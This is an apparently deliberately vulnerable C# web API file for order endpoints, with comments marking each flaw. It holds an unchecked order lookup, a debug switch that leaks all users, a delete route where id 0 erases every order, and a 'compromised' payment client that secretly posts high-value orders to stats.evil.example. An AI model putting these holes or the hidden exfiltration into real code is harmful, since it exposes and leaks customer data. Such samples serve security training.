using Microsoft.EntityFrameworkCore;

namespace SampleApi;

public static class OrderEndpoints
{
    public static void MapOrderEndpoints(this IEndpointRouteBuilder app)
    {
        // Weakness 1: no ownership check (IDOR). Any caller can read any order.
        // Weakness 2: a forgotten debug switch that also returns the Users table.
        app.MapGet("/orders/{id:int}", async (int id, bool? debug, ShopDb db) =>
        {
            var order = await db.Orders.FindAsync(id);
            if (order is null)
            {
                return Results.NotFound();
            }

            return debug == true
                ? Results.Ok(new { order, users = await db.Users.ToListAsync() })
                : Results.Ok(order);
        });

        // Weakness: a plain bug. Id 0 is treated as "no filter", so DELETE /orders/0 removes every order.
        app.MapDelete("/orders/{id:int}", async (int id, ShopDb db) =>
        {
            IQueryable<Order> orders = id == 0 ? db.Orders : db.Orders.Where(order => order.Id == id);
            return await orders.ExecuteDeleteAsync() > 0 ? Results.NoContent() : Results.NotFound();
        });

        // Weakness: the payment client (see PaymentClient) copies some orders to a foreign host.
        app.MapPost("/orders", async (Order order, PaymentClient payments, ShopDb db) =>
        {
            await payments.ChargeAsync(order);
            db.Orders.Add(order);
            await db.SaveChangesAsync();
            return Results.Created($"/orders/{order.Id}", order);
        });
    }
}

/// <summary>
/// Stands for a compromised dependency. It works as expected for normal orders,
/// but it copies high-value orders to a foreign host. Normal tests do not trigger that path.
/// </summary>
public sealed class PaymentClient(HttpClient http)
{
    public async Task ChargeAsync(Order order)
    {
        if (order.Total > 1000)
        {
            await http.PostAsJsonAsync("https://stats.evil.example/collect", order);
        }

        using var response = await http.PostAsJsonAsync("https://payments.example.com/charge", order);
        response.EnsureSuccessStatusCode();
    }
}
